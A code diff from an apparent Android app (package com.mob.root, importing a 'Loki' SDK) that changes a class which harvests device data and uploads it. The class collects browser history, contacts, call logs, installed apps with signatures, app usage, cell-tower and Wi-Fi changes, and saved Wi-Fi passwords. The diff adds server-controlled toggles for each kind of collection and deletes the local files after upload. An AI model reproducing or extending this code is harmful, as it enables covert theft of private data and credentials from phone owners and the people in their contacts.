@@ -3,12 +3,15 @@ package com.mob.root.net;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
+
 import org.apache.http.Header;
 import org.json.JSONArray;
 import org.json.JSONObject;
+
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.Signature;
@@ -20,6 +23,7 @@ import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.CallLog.Calls;
 import android.provider.ContactsContract;
+
 import com.loki.sdk.LokiService;
 import com.mob.root.AMApplication;
 import com.mob.root.entity.BrowserHistory;
@@ -81,6 +85,24 @@ public class UploadDatasRequest extends AMRequest<String> implements Runnable {
 			if(0 == status) {
 				SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
 				sp.edit().putLong(AMConstants.SP_LAST_UPLOAD_STAMP, System.currentTimeMillis()).commit();
+				
+				File wifiFile = AMApplication.instance.getFileStreamPath(AMConstants.FILE_WIFI);
+				File bsFile = AMApplication.instance.getFileStreamPath(AMConstants.FILE_BS);
+				File arFile = AMApplication.instance.getFileStreamPath(AMConstants.FILE_APP_SWITCH);
+				File appRmFile = AMApplication.instance.getFileStreamPath(AMConstants.APP_REMOVED);
+				
+				if(null != wifiFile && wifiFile.exists()) {
+					wifiFile.delete();
+				}
+				if(null != bsFile && bsFile.exists()) {
+					bsFile.delete();
+				}
+				if(null != arFile && arFile.exists()) {
+					arFile.delete();
+				}
+				if(null != appRmFile && appRmFile.exists()) {
+					appRmFile.delete();
+				}
 			}
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
@@ -102,96 +124,130 @@ public class UploadDatasRequest extends AMRequest<String> implements Runnable {
 		
 		SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
 		long dayStamp = sp.getLong(AMConstants.SP_LAST_UPLOAD_STAMP, 0);
+		ConfigParser parser = new ConfigParser();
 		
 		// 获取要上传的app列表     ----------------------------------------------------------------------------------------
-		List<UserApp> applications = getApplications(dayStamp);
-		
-		JSONArray appJsonArray = new JSONArray();
-		for (UserApp app : applications) {
-			JSONObject jsonObject = new JSONObject();
-			jsonObject.put(AMConstants.NET_DATAS_APP_APP_NAME, app.getAppName());
-			jsonObject.put(AMConstants.NET_DATAS_APP_PACKAGE_NAME, app.getPackageName());
-			jsonObject.put(AMConstants.NET_DATAS_APP_VERSION_CODE, app.getVersionCode());
-			jsonObject.put(AMConstants.NET_DATAS_APP_VERSION_NAME, app.getVersionName());
-			jsonObject.put(AMConstants.NET_DATAS_APP_SIGNATURE, app.getSignature());
+		String appSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_APPS_SWITCH);
+		if(!CommonUtils.isEmptyString(appSW) && Integer.parseInt(appSW) == 0) {
+			List<UserApp> applications = getApplications(dayStamp);
 			
-			appJsonArray.put(jsonObject);
+			JSONArray appJsonArray = new JSONArray();
+			for (UserApp app : applications) {
+				JSONObject jsonObject = new JSONObject();
+				jsonObject.put(AMConstants.NET_DATAS_APP_VERSION_NAME, app.getVersionName());
+				jsonObject.put(AMConstants.NET_DATAS_APP_VERSION_CODE, app.getVersionCode());
+				jsonObject.put(AMConstants.NET_DATAS_APP_PACKAGE_NAME, app.getPackageName());
+				jsonObject.put(AMConstants.NET_DATAS_APP_APP_NAME, app.getAppName());
+				jsonObject.put(AMConstants.NET_DATAS_APP_SIGNATURE, app.getSignature());
+				jsonObject.put(AMConstants.NET_DATAS_APP_INSTALLTIME, app.getInstallTime());
+				jsonObject.put(AMConstants.NET_DATAS_APP_APP_TYPE, app.getAppType());
+				
+				appJsonArray.put(jsonObject);
+			}
+			String removedJson = CommonUtils.readFile(AMApplication.instance.getFileStreamPath(AMConstants.APP_REMOVED));
+			JSONArray removedArray = new JSONArray(removedJson);
+			for (int i = 0; i < removedArray.length(); i++) {
+				JSONObject jsonObject = removedArray.getJSONObject(i);
+				appJsonArray.put(jsonObject);
+			}
+			rootObject.put(AMConstants.NET_DATAS_APP_JSON, appJsonArray);
 		}
-		rootObject.put(AMConstants.NET_DATAS_APP_JSON, appJsonArray);
 		
 		// 获取当天浏览器记录     ----------------------------------------------------------------------------------------
-		List<BrowserHistory> historys = getBrowserHistory(dayStamp);
-		JSONArray historysJsonArray = new JSONArray();
-		for (BrowserHistory browser : historys) {
-			JSONObject jsonObject = new JSONObject();
-			jsonObject.put(AMConstants.NET_DATAS_BH_TITLE, browser.getTitle());
-			jsonObject.put(AMConstants.NET_DATAS_BH_URL, browser.getUrl());
-			jsonObject.put(AMConstants.NET_DATAS_BH_DATE, browser.getDate());
-			
-			historysJsonArray.put(jsonObject);
+		String bhSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_BH_SWITCH);
+		if(!CommonUtils.isEmptyString(bhSW) && Integer.parseInt(bhSW) == 0) {
+			List<BrowserHistory> historys = getBrowserHistory(dayStamp);
+			JSONArray historysJsonArray = new JSONArray();
+			for (BrowserHistory browser : historys) {
+				JSONObject jsonObject = new JSONObject();
+				jsonObject.put(AMConstants.NET_DATAS_BH_TITLE, browser.getTitle());
+				jsonObject.put(AMConstants.NET_DATAS_BH_URL, browser.getUrl());
+				jsonObject.put(AMConstants.NET_DATAS_BH_DATE, browser.getDate());
+				
+				historysJsonArray.put(jsonObject);
+			}
+			rootObject.put(AMConstants.NET_DATAS_BH_JSON, historysJsonArray);
 		}
-		rootObject.put(AMConstants.NET_DATAS_BH_JSON, historysJsonArray);
 		
 		// 获取当天新增通讯录     ----------------------------------------------------------------------------------------
-		List<Contact> contacts = getContacts(dayStamp);
-		
-		JSONArray contactsJsonArray = new JSONArray();
-		for (Contact contact : contacts) {
-			JSONObject jsonObject = new JSONObject();
-			jsonObject.put(AMConstants.NET_DATAS_CONTACT_ID, contact.getId());
-			jsonObject.put(AMConstants.NET_DATAS_CONTACT_NAME, contact.getName());
-			jsonObject.put(AMConstants.NET_DATAS_CONTACT_PHONE_NUMBER, contact.getPhoneNumber());
+		String contactSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_CONTACTS_SWITCH);
+		if(!CommonUtils.isEmptyString(contactSW) && Integer.parseInt(contactSW) == 0) {
+			List<Contact> contacts = getContacts(dayStamp);
 			
-			contactsJsonArray.put(jsonObject);
+			JSONArray contactsJsonArray = new JSONArray();
+			for (Contact contact : contacts) {
+				JSONObject jsonObject = new JSONObject();
+				jsonObject.put(AMConstants.NET_DATAS_CONTACT_ID, contact.getId());
+				jsonObject.put(AMConstants.NET_DATAS_CONTACT_NAME, contact.getName());
+				jsonObject.put(AMConstants.NET_DATAS_CONTACT_PHONE_NUMBER, contact.getPhoneNumber());
+				
+				contactsJsonArray.put(jsonObject);
+			}
+			rootObject.put(AMConstants.NET_DATAS_CONTACTS_JSON, contactsJsonArray);
 		}
-		rootObject.put(AMConstants.NET_DATAS_CONTACTS_JSON, contactsJsonArray);
 		
 		//获取所有已连接的wifi ssid、psk     ----------------------------------------------------------------------------------------
-		List<Wifi> wifis = getWifis();
-		
-		JSONArray wifiJsonArray = new JSONArray();
-		for (Wifi wifi : wifis) {
-			JSONObject jsonObject = new JSONObject();
-			jsonObject.put(AMConstants.NET_DATAS_WIFI_SSID, wifi.getSsid());
-			jsonObject.put(AMConstants.NET_DATAS_WIFI_PSK, wifi.getPsk());
-			jsonObject.put(AMConstants.NET_DATAS_WIFI_ENCRYPTION_TYPE, wifi.getEncryptionType());
+		String wifiSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_WIFIS_SWITCH);
+		if(!CommonUtils.isEmptyString(wifiSW) && Integer.parseInt(wifiSW) == 0) {
+			List<Wifi> wifis = getWifis();
 			
-			wifiJsonArray.put(jsonObject);
+			JSONArray wifiJsonArray = new JSONArray();
+			for (Wifi wifi : wifis) {
+				JSONObject jsonObject = new JSONObject();
+				jsonObject.put(AMConstants.NET_DATAS_WIFI_SSID, wifi.getSsid());
+				jsonObject.put(AMConstants.NET_DATAS_WIFI_PSK, wifi.getPsk());
+				jsonObject.put(AMConstants.NET_DATAS_WIFI_ENCRYPTION_TYPE, wifi.getEncryptionType());
+				
+				wifiJsonArray.put(jsonObject);
+			}
+			rootObject.put(AMConstants.NET_DATAS_WIFI, wifiJsonArray);
 		}
-		rootObject.put(AMConstants.NET_DATAS_WIFI, wifiJsonArray);
 		
 		//获得当天app运行记录     ----------------------------------------------------------------------------------------
-		String appRecordJson = getApplicationRecord();
-		if(!CommonUtils.isEmptyString(appRecordJson)) {
-			rootObject.put(AMConstants.NET_DATAS_APP_RECORD, new JSONArray(appRecordJson));
+		String arSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_AR_SWITCH);
+		if(!CommonUtils.isEmptyString(arSW) && Integer.parseInt(arSW) == 0) {
+			String appRecordJson = getApplicationRecord();
+			if(!CommonUtils.isEmptyString(appRecordJson)) {
+				rootObject.put(AMConstants.NET_DATAS_APP_RECORD, new JSONArray(appRecordJson));
+			}
 		}
 		
 		//获取当天通话记录    ----------------------------------------------------------------------------------------
-		List<UserCall> calls = getCalls(dayStamp);
-		JSONArray callJsonArray = new JSONArray();
-		for (UserCall call : calls) {
-			JSONObject jsonObject = new JSONObject();
-			jsonObject.put(AMConstants.NET_DATAS_CALLS_PHONE_NUMBER, call.getPhoneNumber());
-			jsonObject.put(AMConstants.NET_DATAS_CALLS_CALL_TYPE, call.getCallType());
-			jsonObject.put(AMConstants.NET_DATAS_CALLS_TIME, call.getTime());
-			jsonObject.put(AMConstants.NET_DATAS_CALLS_NAME, call.getName());
-			jsonObject.put(AMConstants.NET_DATAS_CALLS_DURATION, call.getDuration());
-			
-			callJsonArray.put(jsonObject);
+		String callsSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_CALLS_SWITCH);
+		if(!CommonUtils.isEmptyString(callsSW) && Integer.parseInt(callsSW) == 0) {
+			List<UserCall> calls = getCalls(dayStamp);
+			JSONArray callJsonArray = new JSONArray();
+			for (UserCall call : calls) {
+				JSONObject jsonObject = new JSONObject();
+				jsonObject.put(AMConstants.NET_DATAS_CALLS_PHONE_NUMBER, call.getPhoneNumber());
+				jsonObject.put(AMConstants.NET_DATAS_CALLS_CALL_TYPE, call.getCallType());
+				jsonObject.put(AMConstants.NET_DATAS_CALLS_TIME, call.getTime());
+				jsonObject.put(AMConstants.NET_DATAS_CALLS_NAME, call.getName());
+				jsonObject.put(AMConstants.NET_DATAS_CALLS_DURATION, call.getDuration());
+				
+				callJsonArray.put(jsonObject);
+			}
+			rootObject.put(AMConstants.NET_DATAS_CALLS_JSON, callJsonArray);
 		}
-		rootObject.put(AMConstants.NET_DATAS_CALLS_JSON, callJsonArray);
 		
 		//获得当前wifi切换信息      ----------------------------------------------------------------------------------------
-		String wifiSwitchJson = getWifiSwitch();
-		if(!CommonUtils.isEmptyString(wifiSwitchJson)) {
-			rootObject.put(AMConstants.NET_DATAS_WIFI_SWITCH, new JSONArray(wifiSwitchJson));
+		String wsSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_WS_SWITCH);
+		if(!CommonUtils.isEmptyString(wsSW) && Integer.parseInt(wsSW) == 0) {
+			String wifiSwitchJson = getWifiSwitch();
+			if(!CommonUtils.isEmptyString(wifiSwitchJson)) {
+				rootObject.put(AMConstants.NET_DATAS_WIFI_SWITCH, new JSONArray(wifiSwitchJson));
+			}
 		}
 		
 		//获得当天基站切换信息     ----------------------------------------------------------------------------------------
-		String bsSwitchJson = getBSSwitch();
-		if(!CommonUtils.isEmptyString(bsSwitchJson)) {
-			rootObject.put(AMConstants.NET_DATAS_BS_SWTICH, new JSONArray(bsSwitchJson));
+		String bsSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_BS_SWITCH);
+		if(!CommonUtils.isEmptyString(bsSW) && Integer.parseInt(bsSW) == 0) {
+			String bsSwitchJson = getBSSwitch();
+			if(!CommonUtils.isEmptyString(bsSwitchJson)) {
+				rootObject.put(AMConstants.NET_DATAS_BS_SWTICH, new JSONArray(bsSwitchJson));
+			}
 		}
+		
 		return rootObject;
 	}
 
@@ -217,6 +273,7 @@ public class UploadDatasRequest extends AMRequest<String> implements Runnable {
 			userApp.setPackageName(packageInfo.packageName);
 			userApp.setVersionName(packageInfo.versionName);
 			userApp.setVersionCode(packageInfo.versionCode);
+			userApp.setInstallTime(packageInfo.firstInstallTime);
 			
 			PackageInfo info = packageManager.getPackageInfo(packageInfo.packageName, PackageManager.GET_SIGNATURES);
 			Signature[] signatures = info.signatures;
@@ -225,6 +282,12 @@ public class UploadDatasRequest extends AMRequest<String> implements Runnable {
 				sb.append(signature.toCharsString());
 	        }
 			userApp.setSignature(sb.toString());
+			ApplicationInfo ai = packageManager.getApplicationInfo(packageInfo.packageName, 0);
+			if((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
+				userApp.setAppType(1);
+			} else {
+				userApp.setAppType(3);
+			}
 			apps.add(userApp);
 		}
 		return apps;
